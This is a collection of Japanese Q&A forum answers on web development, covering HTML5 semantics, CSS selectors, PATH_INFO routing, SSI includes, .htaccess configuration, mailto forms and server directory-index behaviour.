厳密に決められているわけではないと思います。 特に個人の趣味の範囲でのWebページで使用するものは、Facebookに限らず自由なものが多いのではないでしょうか。 （実際に、FacebookやTwitterのロゴの作り方をレクチャーしているWebサイトもありますので…） ただ、こちら（https://www.facebookbrand.com）を見てみると、Facebookのブランドイメージを変えたり損なったりするようなこと は止めておいたほうが無難な気がします。 Facebookが公式で配布しているロゴもありますし、Facebookが青をブランドカラーをしているなら、それに従っておいたほうがお互いにいいのではないでしょうか。 こちらから利用規約も確認できるので、一度目を通しておくといいかもしれません。 https://www.facebook.com/policies/
＞PATH_INFOでやるのなら、具体的にどうやれば良いのですか？ 　これが一番単純で分かりやすい方法でページ数が増減しても関係ない方法です。私はPerlですので、PHPでも同じ方法で出来ます。 1) hoge というPHPファイルを作成します。拡張子はつけないほうがスマートでしょう。 2) それをサイトの特定のディレクトリに置きます。 　.htaccessにて 　　　hogeファイルをPHPとして動作するよう指定する。 　　　index.php をDIRECTORY INDEXに指定する。 　これで、hoge/index.htmlまたは、ファイル名指定なしでhogeを要求されると、hogeが実行されて表示される。URL欄は、****/hoge/ または、**/hoge/indexhtmlになる。 4) サブページを隠しフォルダーに入れる。 ここから・・ 3) hogeの内容、フローチャート□(処理)、＜＞判断、○端子 　□ 環境変数 PATH_INFOがあれば記憶しておく 　 □ 環境変数 HTTP_COOKIEを解釈しておく(例 b>d>a>c> ) 　 □ サブフォルダーを開いて、中にあるファイルの一覧を用意する。 　<PATH_INFOの値> 　　├ ○ /a.php、b.php、c.php・・などの場合(例)b.php 　　│　HTTP_COOKIE が "b>d>a>c>だったら、次はa.php 　　｜　　リンク文字列を $LINK = '<a href="./a.php">Aに</a>'などにする。 　　｜　開くファイル名を $FILE = b.phpとする。 　　└-○ それ以外 　　　　サブフォルダーのファイル名をランダムに並べる 　　　　cookieを作る。 　　　　　リンク文字を$LINK = '<a href="./b.php">BAに</a>'などにする。 　　　　開くファイル名を $FILE = b.phpとする。 　□ $Fileをインクルードする。その時にリンク部分は書き換える。 　COOKIEの有効期間は、セッション間で良いでしょう。期間を設けても良いかも。 　ブラウザのURL欄とページ内リンクには、上記配列(b>d>a>c)の場合、普通に ****hoge/ ないし****hoge/index.php 　　<a href="b.php">Bへ</a> ↓ ****hoge/b.php 　　<a href="d.php">Dへ</a> ↓ ****hoge/d.php 　　<a href="a.php">Aへ</a> ↓ ****hoge/a.php 　　<a href="c.php">Cへ</a> となります。 　PATH_INFOは動的なサイトの場合、とてもよく利用される手法です。大規模なサイトはほとんどすべてPATH_INFOと考えてよいです。 　　　　
aに擬似要素を適用させてやればいけそうな気がします。 p.figure a { position: relative; } p#jpg01 a:hover:after { content: url(重ねる画像.png); position: absolute; bottom: 0; left: 0; }
　フレームワークの最大の問題点は、文書構造とプレゼンテーションの分離と言うHTML/CSSの最大の目的が果たされない事です。 ★構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　プレゼンテーションのために、HTMLが書かれてしまいますから、HTMLの内容を変更したり、デザインを変更したいというときに困ったことになります。 　フレームワークを使うということは発想はDTP( http://ja.wikipedia.org/wiki/DTP )と同じですが、HTMLとDTPはまったく逆の発想です。HTMLはSGMLから派出したもので、基本は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 電子文書は特定の企業のワープロソフトを用いるとそのソフトのバージョンが上がったり、最悪の場合そのソフトを開発している会社が開発を中止したり、倒産したりしてソフトウェアが無くなった場合は、今まで作成したデータが読めなくなるという問題が発生してしまう。そこで、プレーンテキストのみを用いて、「タグ」を使うことによってデータに意味を持たせることが考えられた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Standard Generalized Markup Language - Wikipedia( http://ja.wikipedia.org/wiki/Standard_Generalize … )］より 　すなわち、<h1>ここは見出し</h1><p>ここからここまではひとつの段落</p><blockquote>ここからは引用ブロック</blockquote><address>ここは著作者情報</address>としておけば、それを解釈して表示する機能さえあれば、誰でも永久に利用できる。 　もちろんスクリーンリーダーでしたら見出しは大きな声で読んでくれるし、段落が変われば一呼吸置いて読んでくれるでしょう。 　お気づきのように、これだけでは文書構造は分かりませんから、HTML5が登場するまではDIVにidやclass名を使用して文書構造を示してきました。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　残念ながら、この部分が理解されずに、DIDはプレゼンテーションのために用いられてきました。その筆頭がフレームワークと言う手法です。これでは、「文書内に埋め込まれた「意味」が不明確( http://www.atmarkit.co.jp/ait/articles/1008/30/n … の中ほど)」なままですから、『HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　HTMLの真髄は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　単に幅広ディスプレイ、スマホ--いずれももmedia:screenだけじゃありません。印刷(media="print")は想定範囲内ですし、サイトの目的から視覚障害者向けの点字端末(braille)、スクリーンリーダー(aural)、スクロールが使えないテレビ(tv)が必要なこともあるでしょう。 　そもそも検索エンジンに不適です。 　ちなみにHTML5では、DIVは原則使わなくなります。 「Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/html5/grouping-content.html … )」 　著者は他に適当な要素がないときの最後の最後の手段としてDIV要素を使用することを強く推奨する。!!! 　わざわざmediaqueryを使用する前に、リキッドで最大限対処して、それでカバーしきれない、あるいはユーザーインターフェースをスマホに最適化するためにmediaqueryで対処するという基本で良いと思います。
#1 です。 HTML上で文字として表示したい場合は <>& をHTMLエンティティ化する必要があり、属性値として指定するなら <>&"' をHTMLエンティティ化する必要があります。 そして、指定した文字コード外の文字を表示したい場合にHTML文字実体参照、HTML文字数値参照が使われます。 UTF-8 文字コードを指定した場合は ISO/IEC 10646(UCS) で規定されている文字は全て使用できるということです。 あなたが指定する文字コードの文字セットを調べ、そこにない文字だけHTML文字実体参照/数値参照を指定してください。 一般に英語圏ならASCII文字を使用しているため、U+00000～U+000FFまでは使用できるはずです。 他の文字については私は知らない為、その時々で調べるか文字参照を使いますね。 &copy; は何となく文字参照を使いたくなりますが…。 # Re: shoshin01さん
そのようなCGIでしたら、フォーム自体もCGIから出力するのが通常ですので、それを書き換えるだけですから・・ Perlでしたら __END__ がスクリプトの終了ですから、そのあとにキーワードを埋め込んだHTMLのテンプレートを書いておく。 　それを while(<DATA>){ 　$_ =~ s/<!-- title -->/$title/; 　・・・同様・・ 　print $_."\n"; } ・・・スクリプト __END__ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title><!--title --></title> <meta name="author" content="ORUKA1951"> <meta http-equiv="Content-Style-Type" content="text/css"> <style type="text/css"> <!-- --> </style> </head> <body> <div class="header"> <h1><!-- title --></h1> </div> とか・・
Ajaxで中身のHTMLをサーバから取ってきて差し替えるという方法もあります。
こんな感じで項目が増やせます。 <form name=mailform> 宛先：<input name=to type=text value="info@example.com"><br> 件名：<input name=subject type=text value="hello"><br> お名前：<input name=name type=text value="namae"><br> 住所：<input name=addr type=text value="jyusyo"><br> <button type=submit>送信</button> </form> <script>window.addEventListener('load',function(ev){ document.forms['mailform'].addEventListener('submit',function(submitEv){ submitEv.preventDefault(); var form = submitEv.target; var to = form.elements['to'].value; var subject = form.elements['subject'].value; var name = form.elements['name'].value; var addr = form.elements['addr'].value; var body = "お名前："+ name + "%0D%0A住所：" + addr if (!to) return; var url = "mailto:" + to + "?subject=" + subject + "&body=" + body; var a = form.appendChild(document.createElement('a')); a.href = url; a.click(); form.removeChild(a); }, false); }, false)</script>
やっつけでやるなら <iframe src="【ご提示のURL】#vbox1"> ご提示のページが質問者様の管理下にあるならば ページ内容を <li id="commentNo2"> <!-- 各コメントを囲む <li> に id 属性を付ける --> <div class="comment_head">... 2. 匿名 2014/05/30(金) 10:19:40 ...</div> <div class="comment">...</div> <div class="value_box" id="vbox2">...</div> </li> と修正したうえで <iframe src="【ご提示のURL】#commentNo2"> 余談ではありますが iframe を幅 800 ピクセル未満で表示すると、 ご提示のページは CSS に不備があるので、テキスト全体が表示されない問題があります。 ご注意ください 参考) http://www.blades.co.jp/blog/2010/07/cssvertical …
「webサイト+ブラウザチェック」でぐぐ～れ～ ＞http://www.ec-cube.net/tsubo/2014/03/10/351
No.2 の > mailto の使用は、閲覧者の環境によって左右される問題がおきやすい ですが、具体的には以下のような事例です mailto は URL の一つですが、ブラウザによっては URL に長さ制限があるため、 長い文章を送ると問題がおきる、かもしれない 参考) http://support.microsoft.com/kb/208427/ja 実例) http://answers.microsoft.com/ja-jp/ie/forum/ie8- … ブラウザからメーラーを立ち上げる仕組みに、閲覧者のメーラーが対応しており、 かつブラウザまたは OS への登録済みでなければならない この条件を満たしていない可能として * Web メールを使っている利用者 * 公共設備であるパソコン * ゲーム機とか家電などのメールを使用しない機器 日本語を使用する場合、メーラーで使用できる文字コードへ変換する必要があるが、 「歴史的経緯」によって変換に失敗する、かもしれない この問題にあまりにも深いので、詳細は割愛します 一般公開するページの場合、メールアドレスを不用意に収集されて SPAM の対象になりえる 本人の意思ではない内容/送信先でメール送信を誘導する仕組みであるため、 悪意のある第三者によりページを改竄されると、 「パソコン遠隔操作事件」まがいの犯罪契機になる、かもしれない というわけで、閲覧者の環境がある程度きまっている会社内イントラネットにて、 「クリックして定型メールを書く」ような用途でもなければ、 Webサーバー側のメールフォーム機能を利用しましょう
HTML5と一括りにするから混乱してしまうのです。 HTML5自体は、それ以前のHTMLと同様なマークアップ言語です。HTML上で動作する仕組みとしてmap機能がありましたね。特にサーバーサイドの場合、画像の上にmapで座標を設定しておくとその座標をサーバーに送ります。 　従来のHTMLでも実際には行なわれてきました。例えば単なるテキストで記述されたHTMLやCSSを読み取ってディスプレイに表示することなど。 　しかし、その機能は制限されていましたが、HTML5ではCAVAS要素のようにブラウザ上に絵を描くこともできるようになります。 　そのためには、ブラウザごとに仕様が異なってはまずい。HTML5ではブラウザの互換性・標準化とともに、これらAPI( Application Programming Interface )も共通化されます。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・ビットマップグラフィックを操作する（Canvas要素） ・ベクタグラフィックを操作する（SVG） ・動画・音声を再生する（Video/Audio要素） ・オフラインWebアプリケーションを実現する ・クロスドメイン通信を実現する ・ローカルストレージを利用する（Web Storage、Indexed Database API） ・バックグラウンド処理（Web Workers） ・サーバプッシュを実現する（Server-Sent Events） ・ケット通信を実現する ・ファイルの読み書き（File API/File Writer API） ・位置情報取得（Geolocation） ・情報を通知する（Web Notification） ・パフォーマンスを測定する（Web Timing、Resource Timing） ・モバイルデバイス用のAPI ・…… ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … )］より 　そのため、ブラウザ上でゲームも可能になりますが、単独では稼げない。というか努力して作っても利益にならない・・・じゃ、アプリ開発に結びつかない。 　そこで、サーバーとの通信を利用してウェブ上で対戦ゲームをするとかする形にすればよい。
No4です。 話題がホームページ(ウェブサイト)だったので面倒な所はあえて避けていたんですが、 電子メールの方の話も書くべきでしたかね。 電子メールで半角カタカナを使ってはいけないのは、ウェブサイトでのものとは理由が異なります。 日本の電子メールは文字コードがISO-2022-JP(通称JISコード)というものが伝統的に主流です。 これは、規格上、半角カタカナを使用することはできません。 ですが、正式な規格に従わず半角カタカナを使用できるようにしたソフトが多くあります。 正式な規格ではないので、半角カタカナを使ったら正常に届く保証がありません。 ですから普通のJISコードを使ったメールで半角カタカナは使ってはいけないのです。 また、電子メールでは文字コードをUTF-8などのUnicodeを使うこともでき、この場合は半角カタカナを使用できます。 しかし、現在に至っても、メールでUnicodeを確実に扱える保証はありません。 (素のUTF-8は8bit目が落ちる可能性あり、UTF-7やBase64化したUTF-8は扱えるソフトが少ない) ですから、Unicodeを使ってすら半角カタカナを確実に相手に届けられるとは言いづらいのが現状です。 ついでにNo7さんの言うMacの文字がUTF-8でも駄目という件ですが、私の認識では問題はShift_JISです。 Macは分かりませんがWindowsには未だにShift_JISを使った処理が残っており、その部分がMacと互換性が無いのです。 双方でUnicodeを使う限り文字化けは起きないと思います。 もっとも表示のズレや字体の違いはありえますが。
＞この場合はやはり、特定の日付のみを設定することになるのでしょうか？ ＞今日から３日後というｓ指定の場合、jqueryを利用するのことになりますか？ 　jquery--javascript使うと、ユーザーがjavascript止めてたり、時計が狂っていたら、あるいは故意にずらしたら困るでしょう。 　だから、javascriptは使いません。どうせ送られたデータCGIなどで処理するのですから、フォーム自体もそれで出力させるのが普通です。
＞例えば、・・・【中略】・・・直接的にサービスには関わらないけれど載せたい記事は、・・・【中略】・・・独立した記事（article）として見なす、という認識で大丈夫でしょうか。 　その場合は、asideのほうがよい場合もあるでしょう。asideだと、googleはたぶん無視する。articleだと拾っていく。 　このあたりの使い分けは、内容と製作側の意図も絡むでしょう。 ＞ナビゲーションといわれるとそのHPのタブなどのメニューのみ、 　navはページ内の目次も含みます。必ずしもウェブサイト内や他のページへのリンクではない。 　逆にfooter内に書く簡単なリンクはnavで囲うべきではありません。footer自体にすでに意味があるので・・ 　
元のソース <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <title></title> <style type="text/css"> <!--　省略　--> </style> </head> を、下記のように修正します。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <title></title> <link rel="stylesheet" type="text/css" href="○○○.css"> <!-- ←○○○の部分はスタイルシートの名前に変更 --> <!--　省略　--> </style> </head> CSSファイルとHTMLファイルの格納場所が異なる場合（例えばHTMLファイルが格納されているフォルダにCSSを格納しているフォルダ（CSS）がある場合）は、上記の『 href="○○○.css" 』を『 href="css/○○○.css" 』としてください。
パンくずリスト、トピックリスト、など階層を示す表示です。 最近ではGoogleの検索結果にも表示されるようになり、SEOにも効果があるとかないとか言われていますね。
.skinTextColor,.skinBaseTextColor,.skinBlock,body{} はグループ化です。 .skinTextColor{} .skinBaseTextColor{} .skinBlock,body{} に同じ指定をするときと同等です。 .skinTextColor{} 　と言う書きかたは、本来のセレクタの書き方ではありません。 現在のウェブ標準とされているCSS2.1では、 『単体セレクタは型セレクタもしくは 全称セレクタのいずれかの直後に、0個以上の属性セレクタ、IDセレクタ、擬似クラスが任意の順序で続くものである。セレクタの構成要素のすべてが一致する場合、単体セレクタはマッチする。( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )』 【・・・いずれかの直後に】と必ず、基点となるセレクタを最初に書くことになっています。すなわち、 *.skinTextColor{} 　と全称セレクタを書きます。意味は全く同じです。 　CSS1との整合のために設けられた『全称セレクタが単体セレクタの唯一の構成要素でない場合、"*"を省略してよい。』で、システムとしては、.skinTextColor{}を*.skinTextColor{}と解釈しているに過ぎません。 ＞例えば、ＣＳＳが外部にあるように、そのクラス指定のタブもどこか違うページにあるのでしょうか？ 　他のページで登場する可能性があるから指定している。 ＞このセレクタのうち３つは、class指定されてるものだと思うのですが、skinTextColorと、skinBaseTextColorはＨＴＭＬの中に見つけられませんでした。 　お気づきのように、そのようなHTMLやスタイルシートの書き方は良くはありません。どこにその宣言が適用されているかHTMLソースを検索して見ないとわからない・・・・なんてのは基本から間違っています。 　例えば、次のようなスタイルシートだとどうでしょう。 div.nav ol{ list-style:none; margin:0;padding:0; text-align:center; } div.header div.nav ol li{ display:inline-block; margin:2px; } div.section div.nav ol li{ display:block; margin:5px 0; } いちいち、HTML開かなくても、 ・ナビゲーションリストはリスト表現しない。テキストはセンター配置 ・ヘッダ内のナビゲーションは横並びブロック ・本文(section)内のナビゲーションはたて並びのブロック 　とすぐ分かる。 　これができるのは、HTMLのDIVやSPANは 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　HTMLには文書構造が書かれているから。文書構造しか書いてないから。 　スタイルシートのセレクタは、HTMLの文書構造に基づいて書くようになっています。 　それが、スタイルシートでデザインする最大の目的 【構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )】 　ちなみに上記クラス名は、HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )名と、その用途を参考にしています。将来HTML5に変更する際、楽です。 　HTMLもCSSも、文字通り簡単にわかりやすくなります。そのためにはまずHTMとCSSの仕様書を読みましょう。へんなサイトをいくら見ても参考にはなりません。かえって迷路に迷い込む。 　まず ・HTML 4.01 仕様書邦訳( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・CSS 2.1仕様（日本語訳）( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )
IEのバグへの対策 ・A.html内のナビゲーションリンクはiframeを使わない ・A.html内の最後のiframeはposition:absoluteでトップに移動させる。 の二点でなんとかなりますね。
＞（a.html）に入力フォームを作成した時 ＞その入力した内容を(b.html）に送信する aのformのactionにb.htmlを指定するだけですが データを受け取るのはb.htmlというよりサーバー側のプログラムなので 必ずしもaで入力した文字がbに表示されるわけではありません
＞frameを使わずにメニューをdivで作っているけど… 　HTML5では、DIVは原則使いません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )］より 　簡単に訳すと、『著者は、他に適切な要素がないときの最後の最後の手段としてdiv要素を使うことを強く推奨する。div要素の変わりにより適切な要素を用いることで、読者には寄りよいアクセス性を著者には保守性の向上につながる』 　そもそもHTML4の時代から、DIVは「id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」であって、決してデザインのためじゃありません。 　HTML4の時代、ナビゲーションを示すために<div class="nav"></div>とclassを使ってナビゲーションだと示していたものを、HTML5では<nav></nav>とマークアップすることになった。というだけです。 　その上で、header内のnav(ナビゲーション)は横並びのボタンにする。 header nav ol{list-style:none;text-align:center;} header nav ol li{display:inline-block;width:18%;} とするということ。 　さて、各ページに共通な記事がある場合、ウェブサーバー創成期からあるとっても古い技術ですが、SSIを使用するのが一般的です。具体的には <!--#include virtual="ssi/siteMap.txt" --> 　とナビゲーションを入れたいところに書いておく [例] <body> 　<header> 　　<h1>このページの見出し</h1> <!--#include virtual="ssi/siteMap.txt" --> 　</header> 　<section> 　　・・・【中略】・・・ 　</section> 　<footer> 　</footer> </body> [/ssi/siteMap.txt] 　　<nav> 　　　<ol> 　　　　<li><a href="/">Top</a></li> 　　　　<li><a href="/Diary">日記</a></li> 　　　　<li><a href="/Profile"></a>プロフィール</li> 　　　　<li><a href="/ContactUs">問合せ</a></li> 　　　</ol> 　　</nav> [結果]サーバーから送られるHTMLのソース [例] <body> 　<header> 　　<h1>このページの見出し</h1> 　　<nav> 　　　<ol> 　　　　<li><a href="/">Top</a></li> 　　　　<li><a href="/Diary">日記</a></li> 　　　　<li><a href="/Profile"></a>プロフィール</li> 　　　　<li><a href="/ContactUs">問合せ</a></li> 　　　</ol> 　　</nav> 　</header> 　<section> 　　・・・【中略】・・・ 　</section> 　<footer> 　</footer> </body> [スタイルシート] header,section,footer{ width:80%;min-width:480px;max-width:900px; margin:0;padding:5px; } header nav ol{ list-style-none; margin:0;padding:0; text-align:center; } header nav ol li{ display:inline-block; width:20%; } 拡張子htmlのファイルをSSIとして動作させるためには.htaccessに AddHandler server-parsed html と書いておく。 ★SSIが使用できない場合は、テキストエディタで一括置換ですかね。 [SSIが可能かテスト] [test.shtml] <!doctype html> <html> <head> <meta charset="utf-8"> <title>サンプル</title> </head> <body> <header> <h1>Your title</h1> <!--#include file="test.txt" --> </header> <section> <h2>本文</h2> </section> <footer> <h3>A nice footer</h3> </footer> </body> </html> 同じ場所にtest.txtを置く 動かなければ、.htaccess に AddHandler server-parsed shtml ダメならサーバーの説明を読むこと。禁止されているかも。 なおはじめに示した方法は絶対パスで書かれていますから、サーバーのどこからでも有効ですがテストのためにローカルサーバーが必要になります。
スマホ用であるか否かは無関係。PC用と共通でよいです。HTMLを使ってウェブページ作成する最大の目的が、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ＞なぜかフッター部分が途中で途切れてしまいます。 　示されたソースではどこがどう切れるかわかりません。 　HTML5を使われているようですが!!だとしたらDIVは原則使ってはなりません。 NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/2012/CR-html5-20121217/grou … ) 　「著者は、他に適当な要素がないときの最後の最後の手段の要素としてdiv要素を表示することを推奨する。」 　また、HTML5ではsmall要素は「細則」を示す要素です。 　　文字を小さくする意味でのsmallはありません。--プレゼンテーションに関わる要素はすべてなくなりました。 ★class名は文書構造を示すために書く物でスタイルシートのために書かない。 　『class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　スタイルシートは文書構造に基づいて書くので・・ 　あとあと、どこに適用されているか宝探しをする羽目になる。 　footer ul li{}でfooter内のul内のliだとわかる。 ★セレクタは基点セレクタを省略しないように!! HTMLはこれだけでよい。それ以外は一切不要です。 <footer> 　　<h2><a href="http://XXXXXXXXXjp/"><img src="http://XXXXXXXXX/img/footer_logo.png" width="228" height="22" alt="テスト"></a></h2> 　　<ul> 　　　　<li><a href="http://XXXXXXXXX.jp/shopinfo/">テスト１</a></li> 　　　　<li><a href="http://XXXXXXXXX.jp/menu/">テスト２</a></li> 　　　　<li><a href="http://XXXXXXXXX.jp/school/">テスト３</a></li> 　　　　<li><a href="http://XXXXXXXXX.jp/prof/">テスト４</a></li> 　　</ul> 　　<address>テスト</address> </footer> html,body{margin:0;padding:0;} header,section,footer{ width:100%;max-width:1000px;min-width:630px;margin:0 auto;padding:5px;} /* ここから */ footer{ height: 148px; background: url(../img/footer_back.png) left top repeat-x; text-align:center; } footer ul{width: 70%;margin: 0 auto;} footer ul,footer ul li{list-style:none;margin:0;padding:0;text0align:center;} footer ul li{display:inline-block;width:20%;} footer ul li+li{border:solid 1px black;border-width:0 0 0 1px;}
例ですが・・ マークアップは、 <div class="nav"> 　<ol> 　　<li><a href=""></a></li> 　　<li><a href=""></a></li> 　</ol> </div> HTML5でしたら<nav></nav>になる。 レスポンスで、呼び出される外部スタイルシート(B)の一方に div.nav ol li+li{display:none;} と書いておけば良いだけです。検索エンジン、通常のパソコンには全部表示されますが、スマホにはスタイルシート(B)が適用されて二つ目のナビゲーションは見えない。 　逆や、一方しか見せないことも同様に簡単です。
拡張子云々は忘れて以下の説明を理解してください。 例えば、URLが、次のようなものだったとします。 http：//hoge.com/abc/efg/hij これは、ブラウザでリンクをクリックすると、HTTPプロトコルで、hoge.comで参照されるインターネット上のコンピューターのHTTPサーバーに対して、/abc/efg/hijファイルをくれ!と要求しています。 GET: /abc/efg/hij という要求ヘッダになります。（Live HTTP Headerの結果を確認する。） サーバーがすること / |-- abc/ 　　　|-- efg/ 　　　　　　|-- hij 　というファイルを探します。(拡張子はこの段階では関係ない) (それがファイルであった場合) 　そのファイルの種類の設定がサーバーにあるか確認します。 　・設定がない場合はデフォルトの指定 　　　--通常はtext/plain と判断して、HTTP応答ヘッダに 　　　content-type:text/plain をつけてブラウザに返します。 　・設定がある場合は、それに従います。 　　(例えば.ataccessにて、 　　　AddType application/x-httpd-cgi efg;だったら実行ファイルとして処理します。 　　　　content-type:はそのプログラムが出力する。 　　　AddType image/jpeg *;　だったら、*(ワイルドカード)なので 　　　　そのディレクトリすべてのファイルをjpegと判断してHTTP応答ヘッダに 　　　　content-image/jpeg　をつけて送り出します。 (そのhijがディレクトリであった場合) 　・それを開いてみます。 　　 ・DIRECTORY INDEXが指定されていれば、そのファイルの有無を調べてそれを提供 　　　通常はindex.html INDEX.HTM index.php・・とか複数指定することが多い。 　　　これを順番に探します。 　　　・存在すれば、そのファイルの指定↑に従います。 　　　　tex/htmlとか application/x-httpd-cgi とか 　　・DIRECTORY INDEXの指定がない(通常は指定されているが)、あるいはDIRECTORY INDEX 　　　に指定がない場合は ★/hojは、PATH_INFOという環境変数に格納して、/efg について、上と全く同じ処理を行ないます。 　　(上の/hijを/efgに置き換えて読む)よって省略 ★/efgもない場合はそれもPATH_INFOに追加します。PATH_INFOの値は /efg/hij になる。 ★ 最後に/ルートについて同様な処理をします。 　それでもない場合は、 　　・404 NOT foundを返すか、 　　・PATH_INFに存在するディレクトリのファイル一覧を返す 　　かの指定に従います。 　　　以前はディレクトリ一覧を表示することが多かったのですが、 　　　最近の素人さんが利用するサーバーはNOT FOUNDを返します。 　　　　　301などを返すよう指示もできます。 　お馬鹿なコンピューターですから、この一見複雑だが単純な機械的処理をしています。 ＞htmlがなければ、表示されていません。従いまして、サーバーの機能ではないと思います。 ＞　A）http://www.hoge.co.jp/hoge.html ＞　B）http://www.hoge.co.jp/hoge　 　それは、 　　・/hogeディレクトリにDIRECTORY_INDEXで指示されたファイルがないか 　　・/hogeファイルがないか 　　・/hogeがCGIであって、エラーを返しているか 　　・/にある「DIRECTORY INDEXに指定して指定されているファイルがない」 　　その他の理由も考えられる。 ＞なるほど、ヘッダー情報を読み取って、 ＞サーバーで表示処理をしているのですね。ご指摘ありがとうございます。 　ヘッダ情報に何を書くかはサーバーの設定ですが、ヘッダー情報を元にブラウザが決めています。 ＞サーバーに電話で問い合わせたところ、 ＞そのような機能はなく、設定もしていないと回答を受けたことと、 　サーバーのデフォルトの指定のままだという事です。 ＞同じレンタルサーバを利用しているサイトで調べると、.html をURLから外せば404が出、 ＞さらにそのサーバー会社のURLから.htmlを外しても、404が出ています。 　これは、 　　・.htmlを外した同名(hoge名の)ディレクトリが存在し 　　・その中にDIRECTORY_INDEXで指定されたファイルがない 　　・その場合に404を返す指定になっている 　と言う事です。 ＞http://www.hoge.com/test.html ＞http://www.hoge.com/test/00002.html　←00002.htmlを削除すると、上記URLが表示される 　DIRECTORY_INDEXにtest.htmlが指定してある以外、通常のデフォルト指定なのです。 　/test ディレクトリが存在している場合は通常はNOT FOUND 401を返すはずですが・
<form style="margin:0px;">
それほどHTMLに詳しい訳ではないですが、恐らくデフォルトの「padding」や「margin」が影響しているのだと思います。 自分はHTMLを書く時は、おまじない的にスタイルに以下のように記述しておきます。（「---」の線は含みません。） -------------------------------- *{ padding: 0; margin: 0; } -------------------------------- 上記のように書いておくと、全てのタグの「padding」と「margin」が0になります。つまり、内側の余白と、外側の余白が、全くなくなります。 ですので、質問者さんが望むレイアウトになると思います。 -------------------------------- <html> <head> <style> *{ padding: 0; margin: 0; } hr{ width: 100%; } </style> </head> <body> <hr> </body> </html> --------------------------------
Googleやyahooの検索エンジンは ロボットと呼ばれるものがネットを巡回して各サイトを収集しています。 つまり、どこからもリンクされていなければ どこかに公開しない限り永遠に検索にはヒットしません。 ただし、無料レンタルサーバーなどで作成した場合は そのレンタル先で自動にリンクが作成されることもあります。
>一般的にこのことを何と呼んでいますか？(ファンクション？用語があると思うのですが) >自分で書いておいてなんですが、ストアドプロシージャが該当するのでしょうか？ まあ、そうですね。ストアドプロシージャっていうのはSQLのクエリーとして一連の処理を記述してストア（保存）したものを指すのが普通だと思います。要するに、データベースのデータの一部ですね。JavaScriptからデータベースに直接アクセスすることはできませんから、サーバー側にプログラムを設置し、そこからストアドプロシージャを呼び出す、という感じになるでしょう。 サーバー側でデータベースアクセスするプログラム全般を指し示す用語というのは、なんでしょうね、パッと思いつきません。そこまで漠然としたものは「サーバーサイドプログラム」としかいいようがないような……。もう少し具体的な話になれば、いろいろな用語や概念説明はできると思いますが、正直いってそこまで説明しても理解するのは難しいのではないですか。 > できれば図とかなどがあって参考にできるサイトを知っていれば教えていただけますか？ 申し訳ないのですが、そうしたサイトはあまり知りません。また、概念図などを見ても、それで理解できるとは思えません。 それよりも、実際にサーバーサイド開発で使われるプログラミング言語（PHPとかRubyとかJavaとかいったもの）を１つでいいので学習して実際に使えるようになるのが一番だと思います。そうすれば、Webブラウザからサーバーに問い合わせてデータベースのデータを受け取る、というのがどういうことか具体的に理解できますから。具体的に「こういう処理をしてこういうデータがこんな形で受け取れるんだ」といったことを自分で書いて動かして確認できれば、データベースアクセスがどういうものか一発で理解できるはずです。
